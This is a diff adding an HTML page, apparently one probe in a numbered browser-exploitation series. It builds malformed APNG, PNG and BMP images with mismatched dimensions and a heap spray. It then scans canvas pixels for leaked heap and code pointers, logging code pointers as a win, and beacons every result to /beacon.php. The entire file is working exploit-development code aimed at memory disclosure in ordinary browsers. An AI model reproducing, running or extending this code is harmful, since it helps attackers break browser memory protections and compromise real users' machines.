@@ -1,0 +1,338 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1114</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<div id="imgs" style="position:absolute;left:-9999px;top:-9999px;"></div>
+<canvas id="c" width="64" height="64" style="display:none;"></canvas>
+<script>
+var L=document.getElementById('log'),IC=document.getElementById('imgs');
+var cvs=document.getElementById('c'),ctx=cvs.getContext('2d');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+B('P1114-BOOT','');
+log('phase','=== P1114: APNG ANIMATED CAPTURE (proper compositor trigger) ===');
+log('info','Fix: Use <img> animation + timed capture to trigger frame compositor');
+
+// PNG helpers (same as P1113)
+function crc32(buf){var t=new Int32Array(256);for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c;}var r=0xFFFFFFFF;for(var i=0;i<buf.length;i++)r=t[(r^buf[i])&0xFF]^(r>>>8);return(r^0xFFFFFFFF)>>>0;}
+function u32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF];}
+function u16be(v){return[(v>>>8)&0xFF,v&0xFF];}
+function chunk(type,data){var tb=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];var cb=new Uint8Array(4+data.length);cb.set(tb,0);cb.set(data,4);var c=crc32(cb);var o=u32be(data.length).concat(tb);for(var i=0;i<data.length;i++)o.push(data[i]);return o.concat(u32be(c));}
+function deflateStored(raw){var out=[],off=0;while(off<raw.length){var rem=raw.length-off,blen=Math.min(rem,65535),last=(off+blen>=raw.length)?1:0;out.push(last,blen&0xFF,(blen>>>8)&0xFF,(~blen)&0xFF,((~blen)>>>8)&0xFF);for(var i=0;i<blen;i++)out.push(raw[off+i]);off+=blen;}var a=1,b=0;for(var i=0;i<raw.length;i++){a=(a+raw[i])%65521;b=(b+a)%65521;}return[0x78,0x01].concat(out).concat(u32be((b<<16)|a));}
+function solidScanlines(w,h,r,g,b,a){var raw=[];for(var y=0;y<h;y++){raw.push(0);for(var x=0;x<w;x++)raw.push(r,g,b,a);}return raw;}
+var SIG=[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A];
+
+// =============================================
+// Build APNG with frame 0 fast → frame 1 as sub-frame → long hold
+// So the <img> animation advances to frame 1 quickly, then stays there
+// =============================================
+function buildAnimAPNG(cW,cH, fW,fH,fXO,fYO, dispOp,blendOp){
+  // Frame 0: full canvas, red, delay = 10ms (fast advance)
+  var f0scan=solidScanlines(cW,cH,0xFF,0x00,0x00,0xFF);
+  var f0z=deflateStored(f0scan);
+  // Frame 1: sub-frame, green, delay = 60000ms (hold forever)
+  var f1scan=solidScanlines(fW,fH,0x00,0xFF,0x00,0xFF);
+  var f1z=deflateStored(f1scan);
+
+  var seq=0;
+  var png=[].concat(SIG);
+  png=png.concat(chunk('IHDR',u32be(cW).concat(u32be(cH),[8,6,0,0,0])));
+  png=png.concat(chunk('acTL',u32be(2).concat(u32be(1)))); // 2 frames, play once
+  // Frame 0: full canvas, 10ms delay, dispose=none, blend=source
+  png=png.concat(chunk('fcTL',u32be(seq++).concat(u32be(cW),u32be(cH),u32be(0),u32be(0),u16be(1),u16be(100),[0,0])));
+  png=png.concat(chunk('IDAT',f0z));
+  // Frame 1: sub-frame, 60s delay, specified dispose/blend
+  png=png.concat(chunk('fcTL',u32be(seq++).concat(u32be(fW),u32be(fH),u32be(fXO),u32be(fYO),u16be(600),u16be(10),[dispOp,blendOp])));
+  png=png.concat(chunk('fdAT',u32be(seq++).concat(Array.prototype.slice.call(f1z))));
+  png=png.concat(chunk('IEND',[]));
+  return new Uint8Array(png);
+}
+
+function scanCanvas(cW,cH,fW,fH,fXO,fYO,tag){
+  var id=ctx.getImageData(0,0,cW,cH);
+  var d=id.data;
+  var red=0,green=0,black=0,other=0,otherVals=[];
+  var heapPtrs=0,codePtrs=0,ptrSamples=[];
+
+  for(var y=0;y<cH;y++){
+    for(var x=0;x<cW;x++){
+      var i=(y*cW+x)*4;
+      var r=d[i],g=d[i+1],b=d[i+2],a=d[i+3];
+      if(r===0xFF&&g===0&&b===0&&a===0xFF)red++;
+      else if(r===0&&g===0xFF&&b===0&&a===0xFF)green++;
+      else if(r===0&&g===0&&b===0&&a===0)black++;
+      else{
+        other++;
+        if(otherVals.length<10)otherVals.push(x+','+y+'='+r+'/'+g+'/'+b+'/'+a);
+      }
+    }
+  }
+
+  // Pointer scan: read pixel pairs as potential 64-bit values
+  var u32=new Uint32Array(id.data.buffer);
+  for(var i=0;i<u32.length-1;i+=2){
+    var lo=u32[i],hi=u32[i+1];
+    if(hi>=0x10&&hi<=0xFF){heapPtrs++;if(ptrSamples.length<5)ptrSamples.push('px'+i+'=0x'+hi.toString(16)+('00000000'+lo.toString(16)).slice(-8));}
+    if(hi>=0x200&&hi<=0x7FFF){codePtrs++;ptrSamples.push('px'+i+'=0x'+hi.toString(16)+('00000000'+lo.toString(16)).slice(-8)+'(CODE!)');}
+  }
+
+  var result='red='+red+'|green='+green+'|black='+black+'|other='+other+'|heap='+heapPtrs+'|code='+codePtrs;
+  if(otherVals.length>0)result+='|vals='+otherVals.join(';');
+  if(ptrSamples.length>0)result+='|ptrs='+ptrSamples.join(';');
+  B(tag,result);
+
+  if(codePtrs>0)log('win',tag+': CODE PTRS! '+ptrSamples.join(', '));
+  else if(heapPtrs>0)log('ptr',tag+': Heap ptrs: '+heapPtrs);
+  else if(other>0)log('warn',tag+': '+other+' unexpected pixels: '+otherVals.slice(0,3).join('; '));
+  else log('info',tag+': red='+red+' green='+green+' black='+black);
+  return {other:other,heap:heapPtrs,code:codePtrs};
+}
+
+// =============================================
+// Test configs — all with timed animation capture
+// =============================================
+var configs=[
+  [64,64, 2,2, 0,0, 0,0, 'A-none-src'],
+  [64,64, 2,2, 0,0, 0,1, 'B-none-over'],
+  [64,64, 2,2, 0,0, 1,0, 'C-bg-src'],
+  [64,64, 2,2, 0,0, 1,1, 'D-bg-over'],
+  [64,64, 2,2, 0,0, 2,0, 'E-prev-src'],
+  [64,64, 2,2, 0,0, 2,1, 'F-prev-over'],
+  [64,64, 1,1, 0,0, 2,1, 'G-1x1-prev-over'],
+  [128,128, 2,2, 0,0, 2,1, 'H-128-prev-over'],
+];
+
+var testQ=[];
+var testIdx=0;
+
+function runNextAnimTest(){
+  if(testIdx>=configs.length){
+    phaseI();
+    return;
+  }
+  var c=configs[testIdx];
+  var cW=c[0],cH=c[1],fW=c[2],fH=c[3],fXO=c[4],fYO=c[5],disp=c[6],blend=c[7],label=c[8];
+  cvs.width=cW;cvs.height=cH;
+
+  log('info','Test '+label+': '+cW+'x'+cH+' sub='+fW+'x'+fH+' d='+disp+' b='+blend);
+
+  var apng=buildAnimAPNG(cW,cH,fW,fH,fXO,fYO,disp,blend);
+  var blob=new Blob([apng],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+
+  var img=document.createElement('img');
+  img.style.width=cW+'px';img.style.height=cH+'px';
+  IC.appendChild(img);
+
+  var captured=false;
+  var captureAttempts=0;
+
+  img.onload=function(){
+    // Image loaded — frame 0 is showing (red)
+    // Wait for animation to advance to frame 1
+    // Frame 0 delay = 10ms, so check after 50ms, 100ms, 200ms, 500ms
+    var delays=[50,100,150,200,300,500,750,1000];
+    for(var i=0;i<delays.length;i++){
+      (function(ms){
+        setTimeout(function(){
+          if(captured)return;
+          captureAttempts++;
+          ctx.clearRect(0,0,cW,cH);
+          ctx.drawImage(img,0,0);
+          var id=ctx.getImageData(0,0,cW,cH);
+          // Check if we see ANY green (frame 1) or ANY non-red/non-zero
+          var hasGreen=false,hasOther=false;
+          for(var p=0;p<id.data.length;p+=4){
+            if(id.data[p]===0&&id.data[p+1]===0xFF&&id.data[p+2]===0&&id.data[p+3]===0xFF){hasGreen=true;break;}
+            if(!(id.data[p]===0xFF&&id.data[p+1]===0&&id.data[p+2]===0&&id.data[p+3]===0xFF)&&
+               !(id.data[p]===0&&id.data[p+1]===0&&id.data[p+2]===0&&id.data[p+3]===0)){
+              hasOther=true;
+            }
+          }
+
+          if(hasGreen&&!captured){
+            // Frame 1 is showing! Capture now
+            captured=true;
+            B('P1114-CAPTURED',label+'|ms='+ms);
+            log('ok','Captured frame 1 at '+ms+'ms');
+            scanCanvas(cW,cH,fW,fH,fXO,fYO,'P1114-'+label);
+            URL.revokeObjectURL(url);
+            img.remove();
+            testIdx++;
+            setTimeout(runNextAnimTest,50);
+          }else if(hasOther&&!captured){
+            captured=true;
+            B('P1114-OTHER',label+'|ms='+ms);
+            log('warn','Non-red/non-green data at '+ms+'ms!');
+            scanCanvas(cW,cH,fW,fH,fXO,fYO,'P1114-'+label);
+            URL.revokeObjectURL(url);
+            img.remove();
+            testIdx++;
+            setTimeout(runNextAnimTest,50);
+          }
+        },ms);
+      })(delays[i]);
+    }
+
+    // Final timeout — capture whatever is showing
+    setTimeout(function(){
+      if(!captured){
+        captured=true;
+        ctx.clearRect(0,0,cW,cH);
+        ctx.drawImage(img,0,0);
+        B('P1114-TIMEOUT',label+'|attempts='+captureAttempts);
+        scanCanvas(cW,cH,fW,fH,fXO,fYO,'P1114-'+label);
+        URL.revokeObjectURL(url);
+        img.remove();
+        testIdx++;
+        setTimeout(runNextAnimTest,50);
+      }
+    },1500);
+  };
+
+  img.onerror=function(){
+    B('P1114-'+label,'LOAD_FAIL');
+    log('fail',label+': Failed to load');
+    URL.revokeObjectURL(url);
+    img.remove();
+    testIdx++;
+    setTimeout(runNextAnimTest,50);
+  };
+
+  img.src=url;
+}
+
+// =============================================
+// Phase I: createImageBitmap test (might give per-frame access)
+// =============================================
+function phaseI(){
+  log('phase','--- PHASE I: createImageBitmap frame access ---');
+
+  var apng=buildAnimAPNG(64,64,2,2,0,0,2,1);
+  var blob=new Blob([apng],{type:'image/png'});
+
+  // Try createImageBitmap with different options
+  var tests=[
+    {name:'full',opts:{}},
+    {name:'crop-0',opts:{resizeWidth:64,resizeHeight:64}},
+    {name:'crop-small',opts:{resizeWidth:2,resizeHeight:2}},
+  ];
+
+  var ibIdx=0;
+  function nextIB(){
+    if(ibIdx>=tests.length){phaseJ();return;}
+    var t=tests[ibIdx];
+    try{
+      createImageBitmap(blob,t.opts).then(function(bmp){
+        cvs.width=bmp.width;cvs.height=bmp.height;
+        ctx.clearRect(0,0,bmp.width,bmp.height);
+        ctx.drawImage(bmp,0,0);
+        scanCanvas(bmp.width,bmp.height,2,2,0,0,'P1114-IB-'+t.name);
+        bmp.close();
+        ibIdx++;nextIB();
+      }).catch(function(e){
+        B('P1114-IB-'+t.name,'ERR:'+e.message);
+        ibIdx++;nextIB();
+      });
+    }catch(e){
+      B('P1114-IB-'+t.name,'THROW:'+e.message);
+      ibIdx++;nextIB();
+    }
+  }
+  nextIB();
+}
+
+// =============================================
+// Phase J: Malformed image formats
+// =============================================
+function phaseJ(){
+  log('phase','--- PHASE J: Malformed image decoders ---');
+
+  // J1: PNG with IHDR=64x64 but IDAT only has 2x2 data
+  var f0scan=solidScanlines(2,2,0,0xFF,0,0xFF); // Only 2x2!
+  var f0z=deflateStored(f0scan);
+  var bad1=[].concat(SIG);
+  bad1=bad1.concat(chunk('IHDR',u32be(64).concat(u32be(64),[8,6,0,0,0]))); // Claims 64x64
+  bad1=bad1.concat(chunk('IDAT',f0z)); // Only 2x2 data
+  bad1=bad1.concat(chunk('IEND',[]));
+  testMalformedImage(new Uint8Array(bad1),'J1-short-idat',64,64);
+
+  // J2: PNG with IHDR=2x2 but IDAT has 64x64 data (overflow!)
+  var f1scan=solidScanlines(64,64,0xFF,0,0xFF,0xFF); // Full 64x64
+  var f1z=deflateStored(f1scan);
+  var bad2=[].concat(SIG);
+  bad2=bad2.concat(chunk('IHDR',u32be(2).concat(u32be(2),[8,6,0,0,0]))); // Claims 2x2
+  bad2=bad2.concat(chunk('IDAT',f1z)); // Full 64x64 data!
+  bad2=bad2.concat(chunk('IEND',[]));
+  testMalformedImage(new Uint8Array(bad2),'J2-overflow-idat',64,64);
+
+  // J3: BMP with biWidth=64 biHeight=2 but pixel data for 64x64
+  // (Minimal BMP: 14B file header + 40B DIB header + pixel data)
+  var bmpW=64,bmpH=2;
+  var bmpRowBytes=bmpW*4; // 32bpp RGBA
+  var bmpPadRow=((bmpRowBytes+3)&~3);
+  var bmpPixelBytes=bmpPadRow*64; // INTENTIONAL: 64 rows of data for height=2
+  var bmpFileSize=14+40+bmpPixelBytes;
+  var bmp=new Uint8Array(bmpFileSize);
+  // BM header
+  bmp[0]=0x42;bmp[1]=0x4D;
+  bmp[2]=bmpFileSize&0xFF;bmp[3]=(bmpFileSize>>8)&0xFF;bmp[4]=(bmpFileSize>>16)&0xFF;bmp[5]=(bmpFileSize>>24)&0xFF;
+  bmp[10]=54;bmp[11]=0;bmp[12]=0;bmp[13]=0; // pixel offset = 54
+  // DIB header (BITMAPINFOHEADER = 40 bytes)
+  bmp[14]=40;bmp[15]=0;bmp[16]=0;bmp[17]=0;
+  bmp[18]=bmpW&0xFF;bmp[19]=(bmpW>>8)&0xFF;bmp[22]=bmpH&0xFF;bmp[23]=(bmpH>>8)&0xFF; // w=64, h=2
+  bmp[26]=1;bmp[27]=0; // planes=1
+  bmp[28]=32;bmp[29]=0; // bpp=32
+  // Fill pixel area with pattern
+  for(var i=54;i<bmpFileSize;i++)bmp[i]=((i-54)&0xFF);
+  testMalformedImage(bmp,'J3-bmp-overflow',64,64);
+
+  // J4: Heap spray then malformed PNG
+  log('phase','--- PHASE J4: Heap spray + malformed PNG ---');
+  var markers=[];
+  for(var i=0;i<500;i++){
+    var ab=new ArrayBuffer(256);
+    var v=new Uint32Array(ab);
+    for(var j=0;j<v.length;j++)v[j]=0xCAFE0000+i;
+    markers.push(ab);
+  }
+  for(var i=0;i<250;i++)markers[i*2]=null;
+  // GC pressure
+  for(var i=0;i<5;i++){var tmp=[];for(var j=0;j<1000;j++)tmp.push(new ArrayBuffer(64));}
+
+  setTimeout(function(){
+    testMalformedImage(new Uint8Array(bad1),'J4-spray-short',64,64);
+    setTimeout(phaseFinal,500);
+  },200);
+}
+
+var malIdx=0;
+function testMalformedImage(data,label,drawW,drawH){
+  var blob=new Blob([data],{type:'image/png'});
+  if(label.indexOf('bmp')>=0)blob=new Blob([data],{type:'image/bmp'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    cvs.width=drawW;cvs.height=drawH;
+    ctx.clearRect(0,0,drawW,drawH);
+    try{ctx.drawImage(img,0,0,drawW,drawH);}catch(e){B('P1114-'+label,'drawERR:'+e.message);URL.revokeObjectURL(url);return;}
+    URL.revokeObjectURL(url);
+    scanCanvas(drawW,drawH,2,2,0,0,'P1114-'+label);
+  };
+  img.onerror=function(){
+    B('P1114-'+label,'LOAD_FAIL');
+    URL.revokeObjectURL(url);
+  };
+  img.src=url;
+}
+
+function phaseFinal(){
+  B('P1114-DONE','');
+  log('phase','=== P1114 COMPLETE ===');
+}
+
+// Start
+setTimeout(runNextAnimTest,100);
+</script>
+</body></html>
